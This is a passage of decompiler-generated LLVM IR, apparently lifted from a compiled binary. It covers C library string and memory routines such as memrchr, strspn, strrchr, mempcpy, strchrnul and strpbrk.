  %v1_1b854 = add i32 %v0_1b854, 1
  %v1_1b858 = urem i32 %v1_1b854, 4
  %v2_1b858 = icmp eq i32 %v1_1b858, 0
  br i1 %v2_1b858, label %dec_label_pc_1b860, label %dec_label_pc_1b848

dec_label_pc_1b860:                               ; preds = %dec_label_pc_1b854, %entry
  %v0_1b864 = phi i32 [ %v0_1b8582, %entry ], [ %v1_1b854, %dec_label_pc_1b854 ]
  %v4_1b860 = mul nuw nsw i32 %v1_1b840, 256
  %v5_1b860 = or i32 %v4_1b860, %v1_1b840
  %v4_1b868 = mul i32 %v5_1b860, 65536
  %v5_1b868 = or i32 %v4_1b868, %v5_1b860
  br label %dec_label_pc_1b86c

dec_label_pc_1b86c:                               ; preds = %dec_label_pc_1b8cc, %dec_label_pc_1b86c, %dec_label_pc_1b860
  %v0_1b8b0 = phi i32 [ %v0_1b864, %dec_label_pc_1b860 ], [ %v4_1b86c, %dec_label_pc_1b86c ], [ %v4_1b86c, %dec_label_pc_1b8cc ]
  %v1_1b86c = inttoptr i32 %v0_1b8b0 to i32*
  %v2_1b86c = load i32, i32* %v1_1b86c, align 4
  %v4_1b86c = add i32 %v0_1b8b0, 4
  %v2_1b874 = xor i32 %v2_1b86c, %v5_1b868
  %v2_1b878 = add i32 %v2_1b874, 2130640639
  %v1_1b880 = sub i32 -1, %v2_1b874
  %v2_1b884 = xor i32 %v2_1b878, %v1_1b880
  %v2_1b888 = and i32 %v2_1b884, -2130640640
  %v2_1b88c = icmp eq i32 %v2_1b888, 0
  br i1 %v2_1b88c, label %dec_label_pc_1b86c, label %dec_label_pc_1b894

dec_label_pc_1b894:                               ; preds = %dec_label_pc_1b86c
  %v2_1b894 = inttoptr i32 %v0_1b8b0 to i8*
  %v3_1b894 = load i8, i8* %v2_1b894, align 1
  %v4_1b894 = zext i8 %v3_1b894 to i32
  %v9_1b89c = icmp eq i32 %v4_1b894, %v1_1b840
  %v1_1b8a0 = add i32 %v0_1b8b0, 3
  br i1 %v9_1b89c, label %dec_label_pc_1b8dc, label %dec_label_pc_1b8a8

dec_label_pc_1b8a8:                               ; preds = %dec_label_pc_1b894
  %v1_1b8a8 = add i32 %v0_1b8b0, 1
  %v2_1b8a8 = inttoptr i32 %v1_1b8a8 to i8*
  %v3_1b8a8 = load i8, i8* %v2_1b8a8, align 1
  %v4_1b8a8 = zext i8 %v3_1b8a8 to i32
  %v9_1b8ac = icmp eq i32 %v4_1b8a8, %v1_1b840
  br i1 %v9_1b8ac, label %bb, label %dec_label_pc_1b8bc

bb:                                               ; preds = %dec_label_pc_1b8a8
  br label %dec_label_pc_1b8dc

dec_label_pc_1b8bc:                               ; preds = %dec_label_pc_1b8a8
  %v1_1b8bc = add i32 %v0_1b8b0, 2
  %v2_1b8bc = inttoptr i32 %v1_1b8bc to i8*
  %v3_1b8bc = load i8, i8* %v2_1b8bc, align 1
  %v4_1b8bc = zext i8 %v3_1b8bc to i32
  %v9_1b8c0 = icmp eq i32 %v4_1b8bc, %v1_1b840
  br i1 %v9_1b8c0, label %dec_label_pc_1b8dc, label %dec_label_pc_1b8cc

dec_label_pc_1b8cc:                               ; preds = %dec_label_pc_1b8bc
  %v2_1b8cc = inttoptr i32 %v1_1b8a0 to i8*
  %v3_1b8cc = load i8, i8* %v2_1b8cc, align 1
  %v4_1b8cc = zext i8 %v3_1b8cc to i32
  %v9_1b8d0 = icmp eq i32 %v4_1b8cc, %v1_1b840
  br i1 %v9_1b8d0, label %dec_label_pc_1b8d8, label %dec_label_pc_1b86c

dec_label_pc_1b8d8:                               ; preds = %dec_label_pc_1b8cc
  br label %dec_label_pc_1b8dc

dec_label_pc_1b8dc:                               ; preds = %dec_label_pc_1b848, %dec_label_pc_1b8bc, %dec_label_pc_1b894, %bb, %dec_label_pc_1b8d8
  %v1_1b8e0 = phi i32 [ %v1_1b8a0, %dec_label_pc_1b8d8 ], [ %v1_1b8a8, %bb ], [ %v1_1b8bc, %dec_label_pc_1b8bc ], [ %v0_1b8b0, %dec_label_pc_1b894 ], [ %v0_1b854, %dec_label_pc_1b848 ]
  ret i32 %v1_1b8e0

; uselistorder directives
  uselistorder i32 %v4_1b86c, { 1, 0 }
  uselistorder i32 %v0_1b8b0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1b860, { 1, 0 }
  uselistorder i32 %v1_1b854, { 1, 0, 2 }
  uselistorder i32 %v0_1b8582, { 2, 1, 0 }
  uselistorder i32 %v1_1b840, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1b8dc, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1b848, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1b8f0 = urem i32 %arg2, 256
  %v2_1b8f4 = add i32 %arg3, %arg1
  %v2_1b90c4 = icmp eq i32 %arg3, 0
  br i1 %v2_1b90c4, label %dec_label_pc_1b91c, label %dec_label_pc_1b914

dec_label_pc_1b8fc:                               ; preds = %dec_label_pc_1b914
  %v1_1b8fc = add i32 %v0_1b8fc, -1
  %v2_1b8fc = inttoptr i32 %v1_1b8fc to i8*
  %v3_1b8fc = load i8, i8* %v2_1b8fc, align 1
  %v4_1b8fc = zext i8 %v3_1b8fc to i32
  %v9_1b900 = icmp eq i32 %v4_1b8fc, %v1_1b8f0
  br i1 %v9_1b900, label %dec_label_pc_1b9bc, label %dec_label_pc_1b908

dec_label_pc_1b908:                               ; preds = %dec_label_pc_1b8fc
  %v1_1b908 = add i32 %v0_1b908, -1
  %v2_1b90c = icmp eq i32 %v1_1b908, 0
  br i1 %v2_1b90c, label %dec_label_pc_1b91c, label %dec_label_pc_1b914

dec_label_pc_1b914:                               ; preds = %entry, %dec_label_pc_1b908
  %v0_1b908 = phi i32 [ %v1_1b908, %dec_label_pc_1b908 ], [ %arg3, %entry ]
  %v0_1b8fc = phi i32 [ %v1_1b8fc, %dec_label_pc_1b908 ], [ %v2_1b8f4, %entry ]
  %v1_1b914 = urem i32 %v0_1b8fc, 4
  %v2_1b914 = icmp eq i32 %v1_1b914, 0
  br i1 %v2_1b914, label %dec_label_pc_1b91c, label %dec_label_pc_1b8fc

dec_label_pc_1b91c:                               ; preds = %dec_label_pc_1b908, %dec_label_pc_1b914, %entry
  %v0_1b9a413 = phi i32 [ %v2_1b8f4, %entry ], [ %v1_1b8fc, %dec_label_pc_1b908 ], [ %v0_1b8fc, %dec_label_pc_1b914 ]
  %v0_1b9909 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1b908 ], [ %v0_1b908, %dec_label_pc_1b914 ]
  %v4_1b91c = mul nuw nsw i32 %v1_1b8f0, 256
  %v5_1b91c = or i32 %v4_1b91c, %v1_1b8f0
  %v4_1b920 = mul i32 %v5_1b91c, 65536
  %v5_1b920 = or i32 %v4_1b920, %v5_1b91c
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1b9909, 3
  br i1 %tmp, label %dec_label_pc_1b928, label %dec_label_pc_1b9b0

dec_label_pc_1b928:                               ; preds = %dec_label_pc_1b91c, %dec_label_pc_1b990.backedge
  %v0_1b94440 = phi i32 [ %v1_1b944, %dec_label_pc_1b990.backedge ], [ %v0_1b9909, %dec_label_pc_1b91c ]
  %v0_1b92839 = phi i32 [ %v1_1b928, %dec_label_pc_1b990.backedge ], [ %v0_1b9a413, %dec_label_pc_1b91c ]
  %v1_1b928 = add i32 %v0_1b92839, -4
  %v2_1b928 = inttoptr i32 %v1_1b928 to i32*
  %v3_1b928 = load i32, i32* %v2_1b928, align 4
  %v2_1b92c = xor i32 %v3_1b928, %v5_1b920
  %v2_1b930 = add i32 %v2_1b92c, 2130640639
  store i32 %v2_1b930, i32* @ip, align 4
  %v1_1b934 = sub i32 -1, %v2_1b92c
  %v2_1b938 = xor i32 %v2_1b930, %v1_1b934
  %v2_1b93c = and i32 %v2_1b938, -2130640640
  %v2_1b940 = icmp eq i32 %v2_1b93c, 0
  %v1_1b944 = add i32 %v0_1b94440, -4
  br i1 %v2_1b940, label %dec_label_pc_1b990.backedge, label %dec_label_pc_1b94c

dec_label_pc_1b990.backedge:                      ; preds = %dec_label_pc_1b928, %dec_label_pc_1b984
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_1b944, 3
  br i1 %tmp46, label %dec_label_pc_1b928, label %dec_label_pc_1b9b0

dec_label_pc_1b94c:                               ; preds = %dec_label_pc_1b928
  %v1_1b94c = add i32 %v0_1b92839, -1
  %v2_1b94c = inttoptr i32 %v1_1b94c to i8*
  %v3_1b94c = load i8, i8* %v2_1b94c, align 1
  %v4_1b94c = zext i8 %v3_1b94c to i32
  %v9_1b950 = icmp eq i32 %v4_1b94c, %v1_1b8f0
  br i1 %v9_1b950, label %dec_label_pc_1b97c, label %dec_label_pc_1b95c

dec_label_pc_1b95c:                               ; preds = %dec_label_pc_1b94c
  %v1_1b95c = add i32 %v0_1b92839, -2
  %v2_1b95c = inttoptr i32 %v1_1b95c to i8*
  %v3_1b95c = load i8, i8* %v2_1b95c, align 1
  %v4_1b95c = zext i8 %v3_1b95c to i32
  %v9_1b960 = icmp eq i32 %v4_1b95c, %v1_1b8f0
  br i1 %v9_1b960, label %dec_label_pc_1b97c, label %dec_label_pc_1b96c

dec_label_pc_1b96c:                               ; preds = %dec_label_pc_1b95c
  %v1_1b96c = add i32 %v0_1b92839, -3
  %v2_1b96c = inttoptr i32 %v1_1b96c to i8*
  %v3_1b96c = load i8, i8* %v2_1b96c, align 1
  %v4_1b96c = zext i8 %v3_1b96c to i32
  %v9_1b970 = icmp eq i32 %v4_1b96c, %v1_1b8f0
  br i1 %v9_1b970, label %dec_label_pc_1b97c, label %dec_label_pc_1b984

dec_label_pc_1b97c:                               ; preds = %dec_label_pc_1b96c, %dec_label_pc_1b95c, %dec_label_pc_1b94c
  %v0_1b97c = phi i32 [ %v1_1b96c, %dec_label_pc_1b96c ], [ %v1_1b95c, %dec_label_pc_1b95c ], [ %v1_1b94c, %dec_label_pc_1b94c ]
  br label %dec_label_pc_1b9bc

dec_label_pc_1b984:                               ; preds = %dec_label_pc_1b96c
  %v1_1b984 = inttoptr i32 %v1_1b928 to i8*
  %v2_1b984 = load i8, i8* %v1_1b984, align 1
  %v3_1b984 = zext i8 %v2_1b984 to i32
  %v9_1b988 = icmp eq i32 %v3_1b984, %v1_1b8f0
  br i1 %v9_1b988, label %dec_label_pc_1b9bc, label %dec_label_pc_1b990.backedge

dec_label_pc_1b9a4:                               ; preds = %dec_label_pc_1b9b0
  %v1_1b9b0 = add i32 %v0_1b9b0, -1
  %v1_1b9a4 = add i32 %v0_1b9a4, -1
  %v2_1b9a4 = inttoptr i32 %v1_1b9a4 to i8*
  %v3_1b9a4 = load i8, i8* %v2_1b9a4, align 1
  %v4_1b9a4 = zext i8 %v3_1b9a4 to i32
  %v9_1b9a8 = icmp eq i32 %v4_1b9a4, %v1_1b8f0
  br i1 %v9_1b9a8, label %dec_label_pc_1b9bc, label %dec_label_pc_1b9b0

dec_label_pc_1b9b0:                               ; preds = %dec_label_pc_1b91c, %dec_label_pc_1b990.backedge, %dec_label_pc_1b9a4
  %v0_1b9a4 = phi i32 [ %v1_1b9a4, %dec_label_pc_1b9a4 ], [ %v0_1b9a413, %dec_label_pc_1b91c ], [ %v1_1b928, %dec_label_pc_1b990.backedge ]
  %v0_1b9b0 = phi i32 [ %v1_1b9b0, %dec_label_pc_1b9a4 ], [ %v0_1b9909, %dec_label_pc_1b91c ], [ %v1_1b944, %dec_label_pc_1b990.backedge ]
  %v2_1b9b0 = icmp eq i32 %v0_1b9b0, 0
  br i1 %v2_1b9b0, label %dec_label_pc_1b9b8, label %dec_label_pc_1b9a4

dec_label_pc_1b9b8:                               ; preds = %dec_label_pc_1b9b0
  br label %dec_label_pc_1b9bc

dec_label_pc_1b9bc:                               ; preds = %dec_label_pc_1b8fc, %dec_label_pc_1b984, %dec_label_pc_1b9a4, %dec_label_pc_1b97c, %dec_label_pc_1b9b8
  %v1_1b9c0 = phi i32 [ %v0_1b97c, %dec_label_pc_1b97c ], [ 0, %dec_label_pc_1b9b8 ], [ %v1_1b9a4, %dec_label_pc_1b9a4 ], [ %v1_1b928, %dec_label_pc_1b984 ], [ %v1_1b8fc, %dec_label_pc_1b8fc ]
  ret i32 %v1_1b9c0

; uselistorder directives
  uselistorder i32 %v0_1b9b0, { 1, 0 }
  uselistorder i32 %v1_1b944, { 1, 0, 2 }
  uselistorder i32 %v1_1b928, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_1b92839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1b91c, { 1, 0 }
  uselistorder i32 %v0_1b9909, { 1, 2, 0 }
  uselistorder i32 %v0_1b8fc, { 1, 0, 2 }
  uselistorder i32 %v2_1b8f4, { 1, 0 }
  uselistorder i32 %v1_1b8f0, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b9bc, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1b9b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b990.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1b928, { 1, 0 }
  uselistorder label %dec_label_pc_1b91c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b914, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1b9fc2 = load i32, i32* @r0, align 4
  %v1_1b9fc3 = inttoptr i32 %v0_1b9fc2 to i8*
  %v2_1b9fc4 = load i8, i8* %v1_1b9fc3, align 1
  %v3_1b9fc5 = zext i8 %v2_1b9fc4 to i32
  store i32 %v3_1b9fc5, i32* @ip, align 4
  %v2_1ba006 = icmp eq i8 %v2_1b9fc4, 0
  br i1 %v2_1ba006, label %dec_label_pc_1ba0c, label %dec_label_pc_1b9e0.preheader

dec_label_pc_1b9d8:                               ; preds = %dec_label_pc_1b9e0
  %v3_1b9e0 = zext i8 %v2_1b9e0 to i32
  %v1_1b9e8 = add i32 %v0_1b9e8, 1
  %v9_1b9d8 = icmp eq i32 %v0_1b9d810, %v3_1b9e0
  br i1 %v9_1b9d8, label %dec_label_pc_1b9f4, label %dec_label_pc_1b9e0

dec_label_pc_1b9e0:                               ; preds = %dec_label_pc_1b9e0.preheader, %dec_label_pc_1b9d8
  %v0_1b9e8 = phi i32 [ %tmp, %dec_label_pc_1b9e0.preheader ], [ %v1_1b9e8, %dec_label_pc_1b9d8 ]
  %v1_1b9e0 = inttoptr i32 %v0_1b9e8 to i8*
  %v2_1b9e0 = load i8, i8* %v1_1b9e0, align 1
  %v2_1b9e4 = icmp eq i8 %v2_1b9e0, 0
  br i1 %v2_1b9e4, label %dec_label_pc_1ba0c, label %dec_label_pc_1b9d8

dec_label_pc_1b9f4:                               ; preds = %dec_label_pc_1b9d8
  %v1_1b9f4 = add i32 %v0_1b9f4, 1
  %v1_1b9f8 = add i32 %v0_1b9f8, 1
  %v1_1b9fc = inttoptr i32 %v1_1b9f8 to i8*
  %v2_1b9fc = load i8, i8* %v1_1b9fc, align 1
  %v3_1b9fc = zext i8 %v2_1b9fc to i32
  store i32 %v3_1b9fc, i32* @ip, align 4
  %v2_1ba00 = icmp eq i8 %v2_1b9fc, 0
  br i1 %v2_1ba00, label %dec_label_pc_1ba0c, label %dec_label_pc_1b9e0.preheader

dec_label_pc_1b9e0.preheader:                     ; preds = %entry, %dec_label_pc_1b9f4
  %v0_1b9f8 = phi i32 [ %v1_1b9f8, %dec_label_pc_1b9f4 ], [ %v0_1b9fc2, %entry ]
  %v0_1b9f4 = phi i32 [ %v1_1b9f4, %dec_label_pc_1b9f4 ], [ 0, %entry ]
  %v0_1b9d810 = phi i32 [ %v3_1b9fc, %dec_label_pc_1b9f4 ], [ %v3_1b9fc5, %entry ]
  br label %dec_label_pc_1b9e0

dec_label_pc_1ba0c:                               ; preds = %dec_label_pc_1b9f4, %dec_label_pc_1b9e0, %entry
  %v0_1ba0c = phi i32 [ 0, %entry ], [ %v0_1b9f4, %dec_label_pc_1b9e0 ], [ %v1_1b9f4, %dec_label_pc_1b9f4 ]
  ret i32 %v0_1ba0c

; uselistorder directives
  uselistorder i32 %v0_1b9e8, { 1, 0 }
  uselistorder label %dec_label_pc_1b9e0.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1ba1c = urem i32 %arg2, 256
  store i32 %v1_1ba1c, i32* @r4, align 4
  %v2_1ba1c = icmp eq i32 %v1_1ba1c, 0
  br i1 %v2_1ba1c, label %dec_label_pc_1ba30, label %dec_label_pc_1ba44.preheader

dec_label_pc_1ba44.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1ba4c3 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_1ba1c)
  %v2_1ba505 = icmp eq i32 %v2_1ba4c3, 0
  br i1 %v2_1ba505, label %dec_label_pc_1ba58, label %dec_label_pc_1ba3c

dec_label_pc_1ba30:                               ; preds = %entry
  %v2_1ba34 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_1ba5c

dec_label_pc_1ba3c:                               ; preds = %dec_label_pc_1ba44.preheader, %dec_label_pc_1ba3c
  %v2_1ba4c6 = phi i32 [ %v2_1ba4c, %dec_label_pc_1ba3c ], [ %v2_1ba4c3, %dec_label_pc_1ba44.preheader ]
  store i32 %v2_1ba4c6, i32* @r5, align 4
  %v1_1ba40 = add i32 %v2_1ba4c6, 1
  store i32 %v1_1ba40, i32* @r0, align 4
  %v0_1ba48 = load i32, i32* @r4, align 4
  %v2_1ba4c = call i32 @__GI_strchr(i32 %v1_1ba40, i32 %v0_1ba48)
  %v2_1ba50 = icmp eq i32 %v2_1ba4c, 0
  br i1 %v2_1ba50, label %dec_label_pc_1ba58, label %dec_label_pc_1ba3c

dec_label_pc_1ba58:                               ; preds = %dec_label_pc_1ba3c, %dec_label_pc_1ba44.preheader
  %v0_1ba58 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ba5c

dec_label_pc_1ba5c:                               ; preds = %dec_label_pc_1ba30, %dec_label_pc_1ba58
  %storemerge = phi i32 [ %v2_1ba34, %dec_label_pc_1ba30 ], [ %v0_1ba58, %dec_label_pc_1ba58 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_1ba4c, { 1, 0 }
  uselistorder i32 %v1_1ba40, { 1, 0 }
  uselistorder i32 %v1_1ba1c, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1ba5c, { 1, 0 }
  uselistorder label %dec_label_pc_1ba3c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_1ba68 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1ba78 = call i32 @memcpy()
  %v0_1ba7c = load i32, i32* @r5, align 4
  %v1_1ba7c = load i32, i32* @r4, align 4
  %v2_1ba7c = add i32 %v1_1ba7c, %v0_1ba7c
  store i32 %v6_1ba68, i32* @r5, align 4
  ret i32 %v2_1ba7c
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1ba90 = urem i32 %arg1, 256
  %v0_1bab02 = load i32, i32* @r0, align 4
  %v1_1bab03 = urem i32 %v0_1bab02, 4
  %v2_1bab04 = icmp eq i32 %v1_1bab03, 0
  br i1 %v2_1bab04, label %dec_label_pc_1bab8, label %dec_label_pc_1ba98

dec_label_pc_1ba98:                               ; preds = %entry, %dec_label_pc_1baac
  %v0_1baac = phi i32 [ %v1_1baac, %dec_label_pc_1baac ], [ %v0_1bab02, %entry ]
  %v1_1ba98 = inttoptr i32 %v0_1baac to i8*
  %v2_1ba98 = load i8, i8* %v1_1ba98, align 1
  %v3_1ba98 = zext i8 %v2_1ba98 to i32
  %v9_1ba9c = icmp eq i32 %v3_1ba98, %v1_1ba90
  br i1 %v9_1ba9c, label %dec_label_pc_1bb68, label %dec_label_pc_1baa4

dec_label_pc_1baa4:                               ; preds = %dec_label_pc_1ba98
  %v2_1baa4 = icmp eq i8 %v2_1ba98, 0
  br i1 %v2_1baa4, label %dec_label_pc_1bb68, label %dec_label_pc_1baac

dec_label_pc_1baac:                               ; preds = %dec_label_pc_1baa4
  %v1_1baac = add i32 %v0_1baac, 1
  %v1_1bab0 = urem i32 %v1_1baac, 4
  %v2_1bab0 = icmp eq i32 %v1_1bab0, 0
  br i1 %v2_1bab0, label %dec_label_pc_1bab8, label %dec_label_pc_1ba98

dec_label_pc_1bab8:                               ; preds = %dec_label_pc_1baac, %entry
  %v0_1babc = phi i32 [ %v0_1bab02, %entry ], [ %v1_1baac, %dec_label_pc_1baac ]
  %v4_1bab8 = mul nuw nsw i32 %v1_1ba90, 256
  %v5_1bab8 = or i32 %v4_1bab8, %v1_1ba90
  %v4_1bac0 = mul i32 %v5_1bab8, 65536
  %v5_1bac0 = or i32 %v4_1bac0, %v5_1bab8
  br label %dec_label_pc_1bac4

dec_label_pc_1bac4:                               ; preds = %dec_label_pc_1bb60, %dec_label_pc_1bb00, %dec_label_pc_1bab8
  %v0_1bb28 = phi i32 [ %v0_1babc, %dec_label_pc_1bab8 ], [ %v4_1bac4, %dec_label_pc_1bb00 ], [ %v4_1bac4, %dec_label_pc_1bb60 ]
  %v1_1bac4 = inttoptr i32 %v0_1bb28 to i32*
  %v2_1bac4 = load i32, i32* %v1_1bac4, align 4
  %v4_1bac4 = add i32 %v0_1bb28, 4
  %v2_1bacc = xor i32 %v2_1bac4, %v5_1bac0
  %v2_1bad0 = add i32 %v2_1bacc, 2130640639
  store i32 %v2_1bad0, i32* @ip, align 4
  %v2_1bad8 = add i32 %v2_1bac4, 2130640639
  %v1_1badc = sub i32 -1, %v2_1bac4
  %v2_1bae0 = xor i32 %v2_1bad8, %v1_1badc
  %v2_1baec = and i32 %v2_1bae0, -2130640640
  %v2_1baf4 = icmp eq i32 %v2_1baec, 0
  br i1 %v2_1baf4, label %dec_label_pc_1bb00, label %dec_label_pc_1bb08

dec_label_pc_1bb00:                               ; preds = %dec_label_pc_1bac4
  %v1_1bae8 = sub i32 -1, %v2_1bacc
  %v2_1baf0 = xor i32 %v2_1bad0, %v1_1bae8
  %v2_1baf8 = and i32 %v2_1baf0, -2130640640
  %v2_1bb00 = icmp eq i32 %v2_1baf8, 0
  br i1 %v2_1bb00, label %dec_label_pc_1bac4, label %dec_label_pc_1bb08

dec_label_pc_1bb08:                               ; preds = %dec_label_pc_1bac4, %dec_label_pc_1bb00
  %v2_1bb08 = inttoptr i32 %v0_1bb28 to i8*
  %v3_1bb08 = load i8, i8* %v2_1bb08, align 1
  %v4_1bb08 = zext i8 %v3_1bb08 to i32
  %v9_1bb0c = icmp eq i32 %v4_1bb08, %v1_1ba90
  br i1 %v9_1bb0c, label %dec_label_pc_1bb68, label %dec_label_pc_1bb18

dec_label_pc_1bb18:                               ; preds = %dec_label_pc_1bb08
  %v2_1bb18 = icmp eq i8 %v3_1bb08, 0
  br i1 %v2_1bb18, label %dec_label_pc_1bb68, label %dec_label_pc_1bb20

dec_label_pc_1bb20:                               ; preds = %dec_label_pc_1bb18
  %v1_1bb20 = add i32 %v0_1bb28, 1
  %v2_1bb20 = inttoptr i32 %v1_1bb20 to i8*
  %v3_1bb20 = load i8, i8* %v2_1bb20, align 1
  %v4_1bb20 = zext i8 %v3_1bb20 to i32
  %v9_1bb24 = icmp eq i32 %v4_1bb20, %v1_1ba90
  br i1 %v9_1bb24, label %dec_label_pc_1bb68, label %dec_label_pc_1bb30

dec_label_pc_1bb30:                               ; preds = %dec_label_pc_1bb20
  %v2_1bb30 = icmp eq i8 %v3_1bb20, 0
  br i1 %v2_1bb30, label %dec_label_pc_1bb68, label %dec_label_pc_1bb38

dec_label_pc_1bb38:                               ; preds = %dec_label_pc_1bb30
  %v1_1bb38 = add i32 %v0_1bb28, 2
  %v2_1bb38 = inttoptr i32 %v1_1bb38 to i8*
  %v3_1bb38 = load i8, i8* %v2_1bb38, align 1
  %v4_1bb38 = zext i8 %v3_1bb38 to i32
  %v9_1bb3c = icmp eq i32 %v4_1bb38, %v1_1ba90
  br i1 %v9_1bb3c, label %dec_label_pc_1bb68, label %dec_label_pc_1bb48

dec_label_pc_1bb48:                               ; preds = %dec_label_pc_1bb38
  %v2_1bb48 = icmp eq i8 %v3_1bb38, 0
  br i1 %v2_1bb48, label %dec_label_pc_1bb68, label %dec_label_pc_1bb50

dec_label_pc_1bb50:                               ; preds = %dec_label_pc_1bb48
  %v1_1bb50 = add i32 %v0_1bb28, 3
  %v2_1bb50 = inttoptr i32 %v1_1bb50 to i8*
  %v3_1bb50 = load i8, i8* %v2_1bb50, align 1
  %v4_1bb50 = zext i8 %v3_1bb50 to i32
  %v9_1bb54 = icmp eq i32 %v4_1bb50, %v1_1ba90
  br i1 %v9_1bb54, label %dec_label_pc_1bb68, label %dec_label_pc_1bb60

dec_label_pc_1bb60:                               ; preds = %dec_label_pc_1bb50
  %v2_1bb60 = icmp eq i8 %v3_1bb50, 0
  br i1 %v2_1bb60, label %dec_label_pc_1bb68, label %dec_label_pc_1bac4

dec_label_pc_1bb68:                               ; preds = %dec_label_pc_1baa4, %dec_label_pc_1ba98, %dec_label_pc_1bb60, %dec_label_pc_1bb50, %dec_label_pc_1bb48, %dec_label_pc_1bb38, %dec_label_pc_1bb30, %dec_label_pc_1bb20, %dec_label_pc_1bb18, %dec_label_pc_1bb08
  %v1_1bb6c = phi i32 [ %v1_1bb50, %dec_label_pc_1bb60 ], [ %v1_1bb50, %dec_label_pc_1bb50 ], [ %v1_1bb38, %dec_label_pc_1bb48 ], [ %v1_1bb38, %dec_label_pc_1bb38 ], [ %v1_1bb20, %dec_label_pc_1bb30 ], [ %v1_1bb20, %dec_label_pc_1bb20 ], [ %v0_1bb28, %dec_label_pc_1bb18 ], [ %v0_1bb28, %dec_label_pc_1bb08 ], [ %v0_1baac, %dec_label_pc_1ba98 ], [ %v0_1baac, %dec_label_pc_1baa4 ]
  ret i32 %v1_1bb6c

; uselistorder directives
  uselistorder i32 %v4_1bac4, { 1, 0 }
  uselistorder i32 %v2_1bac4, { 0, 2, 1 }
  uselistorder i32 %v0_1bb28, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1bab8, { 1, 0 }
  uselistorder i32 %v1_1baac, { 1, 0, 2 }
  uselistorder i32 %v0_1bab02, { 2, 1, 0 }
  uselistorder i32 %v1_1ba90, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_1bb68, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1bb08, { 1, 0 }
  uselistorder label %dec_label_pc_1ba98, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bba4

dec_label_pc_1bb80:                               ; preds = %dec_label_pc_1bb90
  %v3_1bb90 = zext i8 %v2_1bb90 to i32
  %v1_1bb98 = add i32 %v0_1bb98, 1
  %v1_1bb80 = load i32, i32* %r0.global-to-local, align 4
  %v9_1bb80 = icmp eq i32 %v3_1bb90, %v1_1bb80
  br i1 %v9_1bb80, label %dec_label_pc_1bb88, label %dec_label_pc_1bb90

dec_label_pc_1bb88:                               ; preds = %dec_label_pc_1bb80
  %v0_1bb88 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1bb88, i32* %r0.global-to-local, align 4
  ret i32 %v0_1bb88

dec_label_pc_1bb90:                               ; preds = %dec_label_pc_1bb80, %dec_label_pc_1bba4
  %v0_1bb98 = phi i32 [ %v1_1bb98, %dec_label_pc_1bb80 ], [ %arg2, %dec_label_pc_1bba4 ]
  %v1_1bb90 = inttoptr i32 %v0_1bb98 to i8*
  %v2_1bb90 = load i8, i8* %v1_1bb90, align 1
  %v2_1bb94 = icmp eq i8 %v2_1bb90, 0
  br i1 %v2_1bb94, label %dec_label_pc_1bba0, label %dec_label_pc_1bb80

dec_label_pc_1bba0:                               ; preds = %dec_label_pc_1bb90
  %v0_1bba0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1bba0 = add i32 %v0_1bba0, 1
  br label %dec_label_pc_1bba4

dec_label_pc_1bba4:                               ; preds = %entry, %dec_label_pc_1bba0
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_1bba0, %dec_label_pc_1bba0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1bba4 = inttoptr i32 %storemerge to i8*
  %v2_1bba4 = load i8, i8* %v1_1bba4, align 1
  %v3_1bba4 = zext i8 %v2_1bba4 to i32
  store i32 %v3_1bba4, i32* %r0.global-to-local, align 4
